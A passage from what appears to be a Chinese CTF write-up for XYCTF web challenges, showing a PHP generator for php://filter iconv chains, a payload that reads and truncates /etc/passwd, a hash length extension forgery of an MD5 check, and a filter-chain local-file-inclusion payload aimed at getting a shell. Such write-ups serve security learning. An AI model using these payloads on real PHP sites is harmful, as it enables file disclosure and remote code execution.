class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = <span class="string">&quot;WFlDVEY8PA==&quot;</span>;<span class="comment">//XYCTF&lt;&lt;</span></span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;0&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO<span class="number">2022</span>KR|convert.iconv.UCS2.UTF8|convert.iconv.<span class="number">8859</span>_3.UCS2&#x27;,</span><br><span class="line">    &#x27;1&#x27;=&gt; &#x27;convert.iconv.ISO<span class="number">8859</span>7.UTF16|convert.iconv.RK<span class="number">1048</span>.UCS-4LE|convert.iconv.UTF32.CP<span class="number">1167</span>|convert.iconv.CP<span class="number">9066</span>.CSUCS4&#x27;,</span><br><span class="line">    &#x27;2&#x27;=&gt; &#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO<span class="number">8859</span>4.GB<span class="number">1300</span>0|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_<span class="number">6937</span>2.CSIBM921&#x27;,</span><br><span class="line">    &#x27;3&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90|convert.iconv.ISO<span class="number">6937.8859</span>_4|convert.iconv.IBM868.UTF-16LE&#x27;,</span><br><span class="line">    &#x27;4&#x27;=&gt; &#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_<span class="number">6937</span>-2|convert.iconv.CP950.UTF-16BE&#x27;,</span><br><span class="line">    &#x27;5&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO<span class="number">2022</span>KR|convert.iconv.UTF16.EUCTW|convert.iconv.<span class="number">8859</span>_3.UCS2&#x27;,</span><br><span class="line">    &#x27;6&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;,</span><br><span class="line">    &#x27;7&#x27;=&gt; &#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;,</span><br><span class="line">    &#x27;8&#x27;=&gt; &#x27;convert.iconv.ISO<span class="number">2022</span>KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27;=&gt; &#x27;convert.iconv.CSIBM<span class="number">1161</span>.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;,</span><br><span class="line">    &#x27;A&#x27;=&gt; &#x27;convert.iconv.<span class="number">8859</span>_3.UTF16|convert.iconv.863.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;a&#x27;=&gt; &#x27;convert.iconv.CP<span class="number">1046</span>.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;,</span><br><span class="line">    &#x27;B&#x27;=&gt; &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB<span class="number">1300</span>0&#x27;,</span><br><span class="line">    &#x27;b&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF<span class="number">00030010</span>|convert.iconv.CSIBM<span class="number">1008</span>.UTF32BE&#x27;,</span><br><span class="line">    &#x27;C&#x27;=&gt; &#x27;convert.iconv.UTF8.CSISO<span class="number">2022</span>KR&#x27;,</span><br><span class="line">    &#x27;c&#x27;=&gt; &#x27;convert.iconv.L4.UTF32|convert.iconv.CP<span class="number">1250</span>.UCS-2&#x27;,</span><br><span class="line">    &#x27;D&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.IBM932.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;d&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.GBK.BIG5&#x27;,</span><br><span class="line">    &#x27;E&#x27;=&gt; &#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO<span class="number">2022</span>CNEXT&#x27;,</span><br><span class="line">    &#x27;e&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-<span class="number">8859</span>-1.ISO_<span class="number">6937</span>&#x27;,</span><br><span class="line">    &#x27;F&#x27;=&gt; &#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO<span class="number">8859</span>4.GB<span class="number">1300</span>0|convert.iconv.CP950.SHIFT_JISX<span class="number">0213</span>|convert.iconv.UHC.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27;=&gt; &#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;g&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;,</span><br><span class="line">    &#x27;G&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90&#x27;,</span><br><span class="line">    &#x27;H&#x27;=&gt; &#x27;convert.iconv.CP<span class="number">1046</span>.UTF16|convert.iconv.ISO<span class="number">6937</span>.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;h&#x27;=&gt; &#x27;convert.iconv.CSGB<span class="number">2312</span>.UTF-32|convert.iconv.IBM-<span class="number">1161</span>.IBM932|convert.iconv.GB<span class="number">1300</span>0.UTF16BE|convert.iconv.864.UTF-32LE&#x27;,</span><br><span class="line">    &#x27;I&#x27;=&gt; &#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO<span class="number">8859</span>4.GB<span class="number">1300</span>0|convert.iconv.BIG5.SHIFT_JISX<span class="number">0213</span>&#x27;,</span><br><span class="line">    &#x27;i&#x27;=&gt; &#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO<span class="number">8859</span>-9.ISO_<span class="number">6937</span>-2|convert.iconv.UTF16.GB<span class="number">1300</span>0&#x27;,</span><br><span class="line">    &#x27;J&#x27;=&gt; &#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI<span class="number">3342</span>.UCS4&#x27;,</span><br><span class="line">    &#x27;j&#x27;=&gt; &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB<span class="number">1300</span>0|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;,</span><br><span class="line">    &#x27;K&#x27;=&gt; &#x27;convert.iconv.863.UTF-16|convert.iconv.ISO<span class="number">6937</span>.UTF16LE&#x27;,</span><br><span class="line">    &#x27;k&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;,</span><br><span class="line">    &#x27;L&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO<span class="number">6937</span>|convert.iconv.OSF<span class="number">00010100</span>.UHC&#x27;,</span><br><span class="line">    &#x27;l&#x27;=&gt; &#x27;convert.iconv.CP-AR.UTF16|convert.iconv.<span class="number">8859</span>_4.BIG5HKSCS|convert.iconv.MSCP<span class="number">1361</span>.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;,</span><br><span class="line">    &#x27;m&#x27;=&gt;&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP<span class="number">1163</span>.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;,</span><br><span class="line">    &#x27;N&#x27;=&gt; &#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;,</span><br><span class="line">    &#x27;n&#x27;=&gt; &#x27;convert.iconv.ISO<span class="number">8859</span>4.UTF16|convert.iconv.IBM<span class="number">5347</span>.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF<span class="number">00010004</span>.T.61&#x27;,</span><br><span class="line">    &#x27;O&#x27;=&gt; &#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-<span class="number">2022</span>-JP-3|convert.iconv.ISO<span class="number">2022</span>JP2.CP775&#x27;,</span><br><span class="line">    &#x27;o&#x27;=&gt; &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF<span class="number">05010001</span>|convert.iconv.IBM912.UTF-16LE&#x27;,</span><br><span class="line">    &#x27;P&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;,</span><br><span class="line">    &#x27;p&#x27;=&gt; &#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO<span class="number">8859-14</span>.ISO<span class="number">6937</span>|convert.iconv.BIG-FIVE.UCS-4&#x27;,</span><br><span class="line">    &#x27;q&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;,</span><br><span class="line">    &#x27;Q&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90|convert.iconv.CSA_T500-<span class="number">1983</span>.UCS-2BE|convert.iconv.MIK.UCS2&#x27;,</span><br><span class="line">    &#x27;R&#x27;=&gt; &#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;,</span><br><span class="line">    &#x27;r&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF<span class="number">00010101</span>&#x27;,</span><br><span class="line">    &#x27;S&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943|convert.iconv.GBK.SJIS&#x27;,</span><br><span class="line">    &#x27;s&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;,</span><br><span class="line">    &#x27;T&#x27;=&gt; &#x27;convert.iconv.L6.UNICODE|convert.iconv.CP<span class="number">1282</span>.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_<span class="number">8859</span>-2.ISO-IR-103&#x27;,</span><br><span class="line">    &#x27;t&#x27;=&gt; &#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27;=&gt; &#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM<span class="number">1133</span>.IBM943&#x27;,</span><br><span class="line">    &#x27;u&#x27;=&gt; &#x27;convert.iconv.CP<span class="number">1162</span>.UTF32|convert.iconv.L4.T.61&#x27;,</span><br><span class="line">    &#x27;V&#x27;=&gt; &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB<span class="number">1300</span>0|convert.iconv.BIG5.JOHAB&#x27;,</span><br><span class="line">    &#x27;v&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO<span class="number">2022</span>KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-<span class="number">8859-14</span>.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.MS932.MS936&#x27;,</span><br><span class="line">    &#x27;w&#x27;=&gt; &#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;,</span><br><span class="line">    &#x27;X&#x27;=&gt; &#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;,</span><br><span class="line">    &#x27;x&#x27;=&gt; &#x27;convert.iconv.CP-AR.UTF16|convert.iconv.<span class="number">8859</span>_4.BIG5HKSCS&#x27;,</span><br><span class="line">    &#x27;Y&#x27;=&gt; &#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX<span class="number">0213</span>|convert.iconv.UHC.CP<span class="number">1361</span>&#x27;,</span><br><span class="line">    &#x27;y&#x27;=&gt; &#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;,</span><br><span class="line">    &#x27;Z&#x27;=&gt; &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM<span class="number">1161</span>.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;,</span><br><span class="line">    &#x27;z&#x27;=&gt; &#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO<span class="number">6937</span>&#x27;,</span><br><span class="line">    &#x27;/&#x27;=&gt; &#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;,</span><br><span class="line">    &#x27;+&#x27;=&gt; &#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-<span class="number">1258</span>.UTF32LE|convert.iconv.ISIRI<span class="number">3342</span>.ISO-IR-157&#x27;,</span><br><span class="line">    &#x27;=&#x27;=&gt; &#x27;&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="meta"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">$filters .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line">$final_payload = <span class="string">&quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">var_dump($filters);</span><br><span class="line"><span class="comment">// echo $final_payload;</span></span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br></pre></td></tr></table></figure><p>最后得到的<code>filters</code>的值再加上<code>string.strip_tags</code>过滤器就是我们的payload，这个过滤器会移除所有 HTML 和 XML 标签，包括 PHP 标签，这也是为啥我们要在<code>XYCTF</code>后面加上<code>&lt;&lt;</code>的原因，这样我们就可以截断文件<code>/etc/passwd</code>的内容。但我这就有个疑问，这个过滤器不是只会移除标签吗，后面文件中的内容按理说不会被移除，但测试后发现确实会将文件<code>/etc/passwd</code>中的内容移除</p><p><img src="https://img2.imgtp.com/2024/04/29/iE3OTsz2.png" alt="image-20240417200805127.png"></p><p><img src="https://img2.imgtp.com/2024/04/29/lbUsio3h.png" alt="image-20240417201000516.png"></p><p>我的phpstorm不知道为啥会报错，就找了个在线网站测了，我这里过滤器构造的字符串是<code>XYCTF&lt;&lt;</code>，可以看到过滤器末尾是加上了过滤器<code>string.strip_tags</code>的，最后输出只有<code>XYCTF</code>，把字符串<code>aaaaaaaaaaaaa</code>是截断了的。然后这里又有个问题，测试的时候加一个<code>&lt;</code>就行了，但这个题必须要加两个及以上才行，最终payload：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/what&#x27;s_this.php?p=convert.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">|convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">|convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UTF16|<span class="type">convert</span>.iconv<span class="number">.863</span>.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO2022KR.UTF16|<span class="type">convert</span>.iconv.L6.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP367.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.CP1361|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM860.UTF16|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-143.</span>ISO2022CNEXT|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP-AR.UTF16|<span class="type">convert</span>.iconv<span class="number">.8859</span>_4.BIG5HKSCS|<span class="type">convert</span>.iconv.MSCP1361.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.iconv.IBM932.UCS<span class="number">-2</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode|<span class="type">string</span>.strip_tags</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p><a href="https://blog.csdn.net/qq_46548764/article/details/136633054">https://blog.csdn.net/qq_46548764/article/details/136633054</a></p><p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p><h3 id="give-me-flag（哈希长度拓展攻击）"><a href="#give-me-flag（哈希长度拓展攻击）" class="headerlink" title="give me flag（哈希长度拓展攻击）"></a>give me flag（哈希长度拓展攻击）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">e307d18c7305ad56bf44edc3b025b836</span><br></pre></td></tr></table></figure><p>实验室的佬们说可能是哈希长度拓展攻击，看了下应该就是。看了半天没看懂原理，算了，浩哥说会用工具就行，我也觉得。🤓🤓🤓</p><p>这里我们可以根据这次比赛的web题的flag大概猜测出flag的长度为43，而且我们都知道flag的最后一个字符是<code>&#125;</code>，在这里，这个<code>&#125;</code>就相当于明文。他给出了flag进行md5后的值，就相当于告诉了我们密文和明文md5后的值。直接用工具梭了，</p><p>第一行要求输入密文和明文md5加密后的值，也就是flag进行md5后的值e307d18c7305ad56bf44edc3b025b836。</p><p>第二行要求输入已知的明文，也就是<code>&#125;</code></p><p>第三行输入密文长度，在flag的长度上减去1就行，因为<code>&#125;</code>算作明文，故要减去一位，也就是42</p><p>第四行输入需要增加的值，就是拼接在后面的字符串，也就是value的值和当前时间戳的值，value值随便，时间戳设置好就行，我是用bp发的</p><p><img src="https://img2.imgtp.com/2024/04/29/KKTKO4Wj.png" alt="image-20240418194258024.png"></p><p>对md5传值<code>c9dd267be4865313b7ff9a1136c7b903</code></p><p>，对value传值<code>&#125;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x01\x00\x00\x00\x00\x00\x00</code>（这里要去掉后面的时间戳，因为题上会拼接），成功😆，这是浩哥在我电脑上打的，不知道为毛我打不成功💩💩💩</p><p><img src="https://img2.imgtp.com/2024/04/29/XneYl9zM.png" alt="image-20240418200047780.png"></p><p>参考文章：<a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><h3 id="ezLFI（叠加过滤器进行文件包含getshell）"><a href="#ezLFI（叠加过滤器进行文件包含getshell）" class="headerlink" title="ezLFI（叠加过滤器进行文件包含getshell）"></a>ezLFI（叠加过滤器进行文件包含getshell）</h3><p>开局进来啥也没有，附件的<code>index.php</code>里有<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，如题目，是个本地文件包含，试了下，可以看<code>/etc/passwd</code>，更加确信了。尝试了很多方法，看不到啥，条件竞争也没弄上。这时候就需要用到一个工具**<a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a>**，之前star学长推荐的，无敌了🤓🤓🤓。通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell。最终payload：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP866.CSUNICODE|<span class="type">convert</span>.iconv.CSISOLATIN5.ISO_6937<span class="number">-2</span>|<span class="type">convert</span>.iconv.CP950.UTF<span class="number">-16</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.865</span>.UTF16|<span class="type">convert</span>.iconv.CP901.ISO6937|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv<span class="number">.855</span>.CP936|<span class="type">convert</span>.iconv.IBM<span class="number">-932.</span>UTF<span class="number">-8</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM869.UTF16|<span class="type">convert</span>.iconv.L3.CSISO90|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.CSA_T500.L4|<span class="type">convert</span>.iconv.ISO_8859<span class="number">-2.</span>ISO-IR<span class="number">-103</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.863</span>.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.ISO6937.UTF16LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO88594.UTF16|<span class="type">convert</span>.iconv.IBM5347.UCS4|<span class="type">convert</span>.iconv.UTF32BE.MS936|<span class="type">convert</span>.iconv.OSF00010004.T<span class="number">.61</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP367.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.CP1361|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM869.UTF16|<span class="type">convert</span>.iconv.L3.CSISO90|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.base64-decode|<span 